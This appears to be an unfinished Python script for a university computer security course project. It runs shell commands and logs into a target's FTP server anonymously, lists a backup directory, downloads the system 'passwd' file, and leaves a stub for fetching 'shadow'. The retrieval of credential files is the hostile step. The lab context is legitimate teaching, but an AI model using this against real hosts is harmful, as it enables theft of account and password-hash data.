"""
myAutoCommand.py
Program Description: Project #2: 
Program Usage: python3 myAutoCommand.py <target_ip_address>

Group Members: Ian Holbrook & Cole Faulk
Date: 10/22/2026
Course: Computer Security (CSCI 3250)
"""

#needed libraries for the program
import subprocess
import ftplib
import sys
import os

OutputFile = "outfile_csci3250.txt"
FTP_User = "anonymous"
FTP_Password = "anonymous@"


def run_command(cmd, output_file):
    """
        This function will 
    
        Args:
           cmd:
           output_file (txt file): outfile_csci3250.txt
    
        Returns:
           
        """
    header = "\n$ " + cmd + "\n"
    print(header, end="")
    output_file.write(header)

    try:
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True,)
        out = result.stdout
    except Exception as e:
        out = f"Error executing command: {e}\n"

    print(out, end="")
    output_file.write(out)
    output_file.flush()  # Ensure the output is written to the file immediately


def ftp_commands(server, output_file):
    """
        This function will 
    
        Args:
           server:
           output_file (txt file): outfile_csci3250.txt
    
        Returns:
           
        """
    header = "\n--- FTP SESSION to "+server+" ---\n"
    print(header, end="")
    output_file.write(header)

    try:
        ftp = ftplib.FTP(server, timeout=15)
        login_message = ftp.login(FTP_User, FTP_Password)
        print(login_message)
        output_file.write(login_message + "\n")

        #list CD
        output_file.write("\nftp> ls\n")
        print("\nftp> ls")
        for item in ftp.nlst():
            print(item)
            output_file.write(item + "\n")

        #change to backup directory
        output_file.write("\nftp> cd backup\n")
        print("\nftp> cd backup")
        ftp.cwd("backup")

        #list backup directory
        output_file.write("\nftp> ls\n")
        print("\nftp> ls")
        for item in ftp.nlst():
            print(item)
            output_file.write(item + "\n")

        #download passwd
        output_file.write("\nftp> get passwd\n")
        print("\nftp> get passwd")
        with open("passwd", "wb") as f:
            ftp.retrbinary("RETR passwd", f.write)
        output_file.write("Downloaded passwd\n")

        #download shadow

        #close session

    except ftplib.all_errors as e:
        error_message = f"FTP error: {e}\n"
        print(error_message)
        output_file.write(error_message)

    output_file.flush()  

def main():
    """
        The main function
    
        Args:
            none

        Returns:
           
        """